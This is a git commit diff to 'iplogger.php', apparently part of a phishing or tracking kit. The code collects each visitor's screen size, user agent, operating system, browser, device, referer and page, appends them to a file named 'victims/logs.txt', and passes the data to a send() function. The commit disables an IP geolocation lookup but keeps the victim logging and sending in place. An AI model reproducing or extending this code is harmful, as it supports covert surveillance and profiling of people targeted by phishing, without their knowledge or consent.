a13d5c7953767346606c8d794de212fa9ab1fb48
Gray Programmerz <hackrefisher@gmail.com>
2021-03-13 11:29:09 +0500

    Update iplogger.php

--- modules/iplogger.php
+++ modules/iplogger.php
@@ -12,20 +12,20 @@ function LogData($IsBot,$Referer,$Page)
 { 
     $user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
 
-    $data = file_get_contents("http://ip-api.com/json");                                                      //Get data
-    $data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
-    $data = str_replace('"','',$data);                                                                        //Remove "
-    $data = str_replace('{','',$data);                                                                        //Remove {
-    $data = str_replace('}','',$data);                                                                        //Remove }
-    $data = $data."\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                       //Append Screen Size
-    $data = $data."\nUser Agent:".$user_agent;                                                                //Append User agent
-    $data = $data."\nOS:".Operating_System($user_agent);                                                      //Append Operating System
-    $data = $data."\nBrowser:".Browser($user_agent);                                                          //Append Browser
-    $data = $data."\nDevice:".Device($user_agent);                                                            //Append Device
-    $data = $data.($Referer == null ? "" : "\nReferer:".$Referer);                                            //Append Http Referer
-    $data = $data."\nPage:".$Page;                                                                            //Append Page Name
-    $data = $data."\nBot:".($IsBot ? "Yes" : "No");                                                           //Append Bot
-    $data .= "\n-----------------------------------------------------\n";                                     //Append dashes
+    //$data = file_get_contents("http://ip-api.com/json");                                                      //Get data
+    //$data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
+    //$data = str_replace('"','',$data);                                                                        //Remove "
+    //$data = str_replace('{','',$data);                                                                        //Remove {
+    //$data = str_replace('}','',$data);                                                                        //Remove }
+    $data = "\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                        //Append Screen Size
+    $data .= "\nUser Agent:".$user_agent;                                                                //Append User agent
+    $data .= "\nOS:".Operating_System($user_agent);                                                      //Append Operating System
+    $data .= "\nBrowser:".Browser($user_agent);                                                          //Append Browser
+    $data .= "\nDevice:".Device($user_agent);                                                            //Append Device
+    $data .= ($Referer == null ? "" : "\nReferer:".$Referer);                                            //Append Http Referer
+    $data .= "\nPage:".$Page;                                                                            //Append Page Name
+    $data .= "\nBot:".($IsBot ? "Yes" : "No");                                                           //Append Bot
+    $data .= "\n\n";                                                                                     //Append dashes
     
     File_Put_Contents(".././victims/logs.txt", $data, FILE_APPEND);                                           //Append data to file
     send($data);
